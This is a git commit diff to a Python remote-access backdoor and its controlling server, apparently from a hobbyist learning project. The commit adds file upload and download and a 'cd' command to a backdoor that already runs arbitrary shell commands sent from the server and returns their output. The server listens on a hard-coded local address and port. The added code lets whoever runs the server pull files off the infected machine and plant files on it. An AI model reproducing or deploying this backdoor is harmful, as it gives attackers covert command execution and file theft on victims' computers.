54504de8423cb8fd620218e8cd9c59a0259f6ce6
Rhett Coleman <68975053+RhettColeman@users.noreply.github.com>
2021-01-01 16:05:09 -0500

    v 1.2

--- backdoor.py
+++ backdoor.py
@@ -2,6 +2,7 @@ import socket #tells python you will be communicating over a network
 import time
 import json
 import subprocess #Allows us to execute commands sent to server
+import os #allows us to use CL commands
 
 
 def connection():
@@ -20,11 +21,36 @@ def shell():
         command = reliable_recv()
         if command =='quit':
             break
+        elif command == 'clear':
+            pass
+        elif command[:3] == 'cd ': #[:3} means IF the first 3 characters match cd_ run this statement
+            os.chdir(command[3:]) #[3:} means only use text after cd_ (ex. cd Desktop = os.cddir(Desktop))
+        elif command[:8] == 'download':  #Allows download command to be received
+            upload_file(command[9:])
+        elif command[:6] == 'upload': #Allows to upload a file
+            download_file(command[7:])
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin = subprocess.PIPE)
             result = execute.stdout.read() + execute.stderr.read()
             result = result.decode()
             reliable_send(result)
+
+def upload_file(file_name):
+    f = open(file_name, 'rb') #rb = read bytes
+    sock.send(f.read())
+
+def download_file(file_name):
+    f = open(file_name, 'wb') #wb = write bytes
+    sock.settimeout(1) #Helps file download not get stuck
+    chunk = sock.recv(1024) #amount of bytes to recv
+    while chunk: #Will run as long as there is something inside the chunk variable.
+        f.write(chunk)
+        try:
+            chunk = sock.recv(1024)
+        except socket.timeout as e:
+            break
+    sock.settimeout(None)
+    f.close()
 
 def  reliable_send(data): #Sends commands to server
     jsondata = json.dumps(data)
--- server.py
+++ server.py
@@ -1,5 +1,6 @@
 import socket #tells python you will be communicating over a network
 import json
+import os
 
 def target_communication():
     while True:
@@ -7,6 +8,14 @@ def target_communication():
         reliable_send(command_data)
         if command_data == 'quit':
             break
+        elif command_data == 'clear': #Allows clear command to work
+            os.system('clear')
+        elif command_data[:3] == 'cd ': #[:3} means IF the first 3 characters match cd_ run this statement
+            pass
+        elif command_data[:8] == 'download': #Allows to download  afile
+            download_file(command_data[9:])
+        elif command_data[:6] == 'upload': #Allows to upload a file
+            upload_file(command_data[7:])
         else:
             result = reliable_recv() #recieves shell output results
             print(result)
@@ -23,6 +32,23 @@ def reliable_recv(): #Recieves commands from backfoor
             return json.loads(data)
         except ValueError:
             continue
+
+def download_file(file_name):
+    f = open(file_name, 'wb') #wb = write bytes
+    target.settimeout(1) #Helps file download not get stuck
+    chunk = target.recv(1024) #amount of bytes to recv
+    while chunk: #Will run as long as there is something inside the chunk variable.
+        f.write(chunk)
+        try:
+            chunk = target.recv(1024)
+        except socket.timeout as e:
+            break
+    target.settimeout(None)
+    f.close()
+
+def upload_file(file_name):
+    f = open(file_name, 'rb') #rb = read bytes
+    target.send(f.read())
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #socket.socket(IPv4,Tcp)
 sock.bind(('192.168.1.19', 5555)) #Host IP and Port to use
